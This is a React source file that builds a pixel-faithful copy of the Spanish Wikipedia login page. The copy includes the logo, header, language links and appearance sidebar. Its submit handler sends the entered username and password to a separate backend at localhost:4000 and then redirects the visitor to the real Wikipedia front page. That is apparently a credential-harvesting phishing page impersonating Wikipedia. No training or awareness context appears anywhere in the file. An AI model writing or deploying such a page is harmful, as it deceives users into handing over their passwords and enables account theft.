import React, { useState } from 'react';
import './LoginForm.css';

const WikipediaLoginPage = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [remember, setRemember] = useState(false);

  // Opciones de apariencia
  const [textSize, setTextSize] = useState('estandar');
  const [width, setWidth] = useState('estandar');
  const [color, setColor] = useState('claro');

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  // ENVÍA usuario/contraseña al backend y redirige a Wikipedia si es correcto
  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('http://localhost:4000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });
      const data = await res.json();
      if (data.success) {
        window.location.href = 'https://es.wikipedia.org/wiki/Wikipedia:Portada';
      } else {
        alert(data.message || 'Usuario o contraseña incorrectos');
      }
    } catch (err) {
      alert('Error de conexión con el servidor');
    }
  };

  return (
    <div className="wiki-global-bg">
      {/* Header */}
      <header className="wiki-header">
        <div className="wiki-header-left">
          <a href="https://es.wikipedia.org/wiki/Wikipedia:Portada" className="wiki-logo-link">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/6/63/Wikipedia-logo.png"
              alt="Wikipedia"
              className="wiki-logo"
            />
            <div className="wiki-logo-text">
              <span className="wiki-logo-title">Wikipedia</span>
              <span className="wiki-logo-sub">La enciclopedia libre</span>
            </div>
          </a>
        </div>
        <div className="wiki-header-center">
          <form className="wiki-search-form" action="#">
            <input
              type="search"
              className="wiki-search-input"
              placeholder="Buscar en Wikipedia"
              aria-label="Buscar en Wikipedia"
            />
            <button className="wiki-search-btn" type="submit">Buscar</button>
          </form>
        </div>
        <div className="wiki-header-right">
          <a href="#" className="wiki-header-link">Donaciones</a>
          <a href="#" className="wiki-header-link">Crear una cuenta</a>
          <a href="#" className="wiki-header-link">Acceder</a>
        </div>
      </header>

      {/* Main Content */}
      <main className="wiki-main">
        <div className="wiki-login-content">
          <h1 className="wiki-login-title">Ingresar</h1>
          <hr className="wiki-login-divider" />
          <div className="wiki-login-info">
            Necesitas tener <i><a href="https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica)" target="_blank" rel="noopener noreferrer">cookies</a></i> permitidos para poder registrarte en Wikipedia.
          </div>
          <div className="wiki-login-langs">
            Idioma:
            <a href="#">Deutsch</a> ·
            <a href="#">English</a> ·
            <a href="#">Esperanto</a> ·
            <a href="#">Français</a> ·
            <a href="#">Italiano</a> ·
            <a href="#">Nederlands</a>
          </div>
          <form className="wiki-login-form" onSubmit={handleSubmit}>
            <div className="wiki-form-group">
              <label htmlFor="username">Usuario</label>
              <input
                id="username"
                name="username"
                type="text"
                autoComplete="username"
                placeholder="Escribe tu nombre de usuario"
                value={formData.username}
                onChange={handleChange}
                required
                tabIndex={1}
              />
            </div>
            <div className="wiki-form-group">
              <label htmlFor="password">Contraseña</label>
              <input
                id="password"
                name="password"
                type="password"
                autoComplete="current-password"
                placeholder="Escribe tu contraseña"
                value={formData.password}
                onChange={handleChange}
                required
                tabIndex={2}
              />
            </div>
            <div className="wiki-form-group wiki-checkbox-group">
              <input
                id="remember"
                name="remember"
                type="checkbox"
                checked={remember}
                onChange={() => setRemember(!remember)}
                tabIndex={3}
              />
              <label htmlFor="remember">Mantener mi sesión iniciada</label>
            </div>
            <button type="submit" className="wiki-login-btn" tabIndex={5}>Acceder</button>
          </form>
          <div className="wiki-login-links">
            <a href="https://es.wikipedia.org/wiki/Ayuda:Registro" target="_blank" rel="noopener noreferrer">Ayuda con el acceso</a>
            <br />
            <a href="#">¿Has olvidado tu contraseña?</a>
          </div>
          <div className="wiki-login-cta-box">
            <div className="wiki-login-cta-img">
              <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Avatar_placeholder_gray.png" alt="" />
            </div>
            <div className="wiki-login-cta-bottom">
              <div className="wiki-login-cta-text"><b>¿No tienes una cuenta?</b></div>
              <a
                href="#"
                className="wiki-login-cta-btn"
                tabIndex={100}
              >
                Únete a Wikipedia
              </a>
            </div>
          </div>
        </div>
        {/* Barra lateral de Apariencia */}
        <aside className="wiki-sidebar">
          <div className="wiki-sidebar-section">
            <div className="wiki-sidebar-title">Apariencia <button className="wiki-sidebar-hide">ocultar</button></div>
            <div className="wiki-sidebar-group">
              <div className="wiki-sidebar-label">Texto</div>
              <label>
                <input type="radio" name="textSize" checked={textSize === 'pequeno'} onChange={() => setTextSize('pequeno')} />
                Pequeño
              </label>
              <label>
                <input type="radio" name="textSize" checked={textSize === 'estandar'} onChange={() => setTextSize('estandar')} />
                Estándar
              </label>
              <label>
                <input type="radio" name="textSize" checked={textSize === 'grande'} onChange={() => setTextSize('grande')} />
                Grande
              </label>
              <div className="wiki-sidebar-note">Esta página siempre usa texto pequeño</div>
            </div>
            <div className="wiki-sidebar-group">
              <div className="wiki-sidebar-label">Anchura</div>
              <label>
                <input type="radio" name="width" checked={width === 'estandar'} onChange={() => setWidth('estandar')} />
                Estándar
              </label>
              <label>
                <input type="radio" name="width" checked={width === 'ancho'} onChange={() => setWidth('ancho')} />
                Ancho
              </label>
            </div>
            <div className="wiki-sidebar-group">
              <div className="wiki-sidebar-label">Color (beta)</div>
              <label>
                <input type="radio" name="color" checked={color === 'automatico'} onChange={() => setColor('automatico')} />
                Automático
              </label>
              <label>
                <input type="radio" name="color" checked={color === 'claro'} onChange={() => setColor('claro')} />
                Claro
              </label>
              <label>
                <input type="radio" name="color" checked={color === 'oscuro'} onChange={() => setColor('oscuro')} />
                Oscuro
              </label>
            </div>
          </div>
        </aside>
      </main>
    </div>
  );
};

export default WikipediaLoginPage;